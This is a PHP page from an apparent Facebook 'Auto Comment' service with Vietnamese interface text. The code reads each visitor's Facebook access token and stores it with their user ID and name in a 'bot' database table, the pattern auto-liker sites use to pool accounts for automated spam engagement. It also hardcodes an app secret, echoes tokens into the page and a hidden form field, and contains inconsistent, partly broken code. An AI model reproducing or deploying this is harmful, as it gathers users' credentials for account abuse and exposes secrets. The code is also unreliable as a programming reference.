﻿<?php
header('Content-Type: text/html; charset=UTF-8');
require 'facebook.php';
session_start();
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
$lamafile = 600;
$waktu = time();
if ($handle = opendir('komen')) {
while(false !== ($file = readdir($handle)))
{
$akses = fileatime('komen/'.$file);
if( $akses !== false)
if( ($waktu- $akses)>=$lamafile )
unlink('komen/'.$file);
}
closedir($handle);
}

$token = $_SESSION[access_token];
$fb_secret  = $_GET["sec"];
$fb_app_url  = 'http://ph.superlike.org/m.php';
include 'config.php';
$facebook = new Facebook(array(
'appId' => '111160212353538',
'secret' => 'd2d951a8566758675db1dbd50327013c',
'cookie' => true
));


mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (
`id` int(11) NOT NULL AUTO_INCREMENT,
`user_id` varchar(32) NOT NULL,
`name` varchar(32) NOT NULL,
`access_token` varchar(255) NOT NULL,
PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
");

try {
$parameters['access_token'] = $_SESSION[access_token];
$userData = $facebook->api('/me', $parameters);
} catch (FacebookApiException $e) {
die("invalid access token");
}

if($userData){

if($userData['id'] =="40"
|| $userData['id'] =="4"
){
echo "Have a Nice Day ^_^, You got Blocked...!!";
echo "<br>";
echo 'You making a spam... <a href="http://fb.com/MrTanDz"> Contact me :p</a>';
exit;
}
if($os=opendir('komen')) {
while($ls = readdir($os)){
if($ls != "." && $ls != ".."){
if($userData['id'] =="$ls"){
$limit = fileatime('komen/'.$user->id);
$timeoff = time();
$cek = date("i:s",$timeoff - $limit);
echo '<div align="center">Vui lòng chờ 10 phút để thực hiện lượt auto tiếp theo nhé <font color="red">'.$user->name.'</font><p>
<font color="red">'.$cek.' - 10:00</font></p></div> ';
exit;
}
}
}
}
//check that user is not already inserted? If is. check it's access token and update if needed
//also make sure that there is only one access_token for each user
$row = null;
$result = mysql_query("
SELECT
*
FROM
bot
WHERE
user_id = '" . mysql_real_escape_string($userData['id']) . "'
");

if($result){
$row = mysql_fetch_array($result, MYSQL_ASSOC);
if(mysql_num_rows($result) > 1){
mysql_query("
DELETE FROM
bot
WHERE
user_id='" . mysql_real_escape_string($userData['id']) . "' AND
id != '" . $row['id'] . "'
");
}
}

if(!$row){
mysql_query(
"INSERT INTO
bot
SET
`user_id` = '" . mysql_real_escape_string($userData['id']) . "',
`name` = '" . mysql_real_escape_string($userData['name']) . "',
`access_token` = '" . mysql_real_escape_string($token) . "'
");
} else {
mysql_query(
"UPDATE
bot
SET
`access_token` = '" . mysql_real_escape_string($token) . "'
WHERE
`id` = " . $row['id'] . "
");
}
}



try {
$parameters['access_token'] = $_SESSION[access_token];
$statuses = $facebook->api('/me/feed?limit=1=', $parameters);
foreach($statuses['data'] as $status)
{
echo $status["me/photo"], "<br />";
}
}
catch (FacebookApiException $e) {
die("invalid access token");
}





?>
<br>
<div class="wrapper wrapper-content animated fadeInRight">
<div class="ibox float-e-margins">
                    <div class="ibox-title">
                        <h5><i class="fa fa-space-shuttle" aria-hidden="true"></i>Auto Comment</h5>
                        <div class="ibox-tools">
                            <a class="collapse-link">
                                <i class="fa fa-chevron-up"></i>
                            </a>
                            <a class="close-link">
                                <i class="fa fa-times"></i>
                            </a>
                        </div>
                    </div>
                   <div class="ibox-content" style="display: block;">
                                <div class="panel-body">
                                   <ul class="list-group border-bottom">

	<div id="bodyupcmt" class="panel-body">
		<form action="ferinormal.php" method="post">	
<div class="tab-content">   
<div align="center"><div class="clip"><img src="https://graph.facebook.com/me/picture?type=large&access_token=<?php echo $token;?>" width='175px' height '150px'></div></div>

<div align="center"><div class="gmenu"><b> <?php echo $userData['name']; ?> </b></div></div>

<div align="center"><div class="gmenu">Status : </div></div>

<div class="phpcode"><div align="center"><?php echo $status["message"];?></div></div>
</br>
<label>ID Status</label>
<div class="input-group">
<span class="input-group-addon"><span class="glyphicon glyphicon-user"></span></span><textarea rows="1" type="text" name="postid" id="postid" class="form-control" value="" placeholder="" autofocus="" required=""><?php echo $status["id"];?></textarea>

</div>

<label>ID Comment</label>
<div class="input-group">
<span class="input-group-addon"><span class="glyphicon glyphicon-comment"></span></span><textarea rows="1" type="text" name="postid" id="postid" class="form-control" value="" placeholder="" autofocus="" required=""><?php echo $status["id"];?></textarea>

</div>

<input type="hidden" name="user" value="<?php echo $token; ?>" />

<label>Nội Dung Comment</label>
<div class="input-group">
<span class="input-group-addon"><span class="glyphicon glyphicon-star"></span></span><textarea rows="1" type="text" name="komen" class="form-control" value="<?php echo $status["id"];?>" placeholder="" autofocus="" required=""></textarea>

</div><br>
<span class="input-group-btn">
	<center>	<button type="submit" name="submit" onClick="done()" class="btn btn-primary">
						<span id="btn-click">
						<span class="glyphicon glyphicon-transfer"></span> Gửi yêu cầu
						</span>
				</button>			</center>			</span>
		</div>	

  </form>
  <center><h3><a href="#" data-target="popup_id"><i class="fa fa-briefcase"></i> Lấy ID Bài Viết</a></h3><center>
</div></div></div>

<div id="thongbao" style="display:none;position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: #f4f4f4;z-index: 99;">
<div class="text" style="position: absolute;top: 45%;left: 0;height: 100%;width: 100%;font-size: 18px;text-align: center;"><center>
<img height="150px" width="150px" src="http://intuitglobal.intuit.com/delivery/cms/prod/sites/default/intuit.ca/images/quickbooks-sui-images/loader.gif" /></center>Yêu Cầu Đang Được Gửi! <br>Vui Lòng Chờ Đợi Trong Giây Lát!
        </div>
    </div>       
</center>
</body>
</html>
